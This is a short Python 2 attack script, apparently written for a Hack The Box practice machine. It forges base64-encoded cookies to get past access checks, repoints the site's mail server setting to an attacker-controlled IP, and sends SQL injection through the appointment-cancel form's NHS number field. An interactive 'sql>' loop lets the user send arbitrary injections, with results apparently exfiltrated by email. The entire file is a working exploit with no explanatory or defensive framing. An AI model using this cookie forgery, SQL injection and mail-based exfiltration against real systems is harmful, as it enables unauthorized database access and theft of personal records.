#!/usr/bin/env python2

import sys
import requests

# Disable ssl warnings from requests
requests.packages.urllib3.disable_warnings()

sql_payload = ""

modus_cookie = "Q29uZmlndXJlPVRydWU="
registered_cookie = "YzFhMWRmODM4MzIyZWI0MGM4Nzc2MGZhZDU3N2IyZTU9VHJ1ZQ=="

smtp_endpoint = "https://freeflujab.htb/?smtp_config"
cancel_endpoint = "https://freeflujab.htb/?cancel"

smtp_payload = { "mailserver": "10.10.14.25", "port": "25", "save": "Save+Mail+Server+Config" }
cancel_payload = { "nhsnum": sql_payload, "submit": "Cancel+Appointment" }

requests.post(smtp_endpoint, data=smtp_payload, cookies=dict(Modus=modus_cookie), verify=False)

print "[+] Settings updated!"

if (len(sys.argv) > 1 and (sys.argv[1] == "interactive" or sys.argv[1] == "-i")):
    while True:
        command = raw_input("sql> ") or "NHS-012-345-6789"
        if (command == "exit"):
            print "[*] Exiting..."
            break
        else:
            cancel_payload = { "nhsnum": command, "submit": "Cancel+Appointment" }
            requests.post(cancel_endpoint, data=cancel_payload, cookies=dict(Registered=registered_cookie), verify=False)
else:
    requests.post(cancel_endpoint, data=cancel_payload, cookies=dict(Registered=registered_cookie), verify=False)
    print "[*] Payload sent, check your smtp server."
    print "[*] Exiting..."
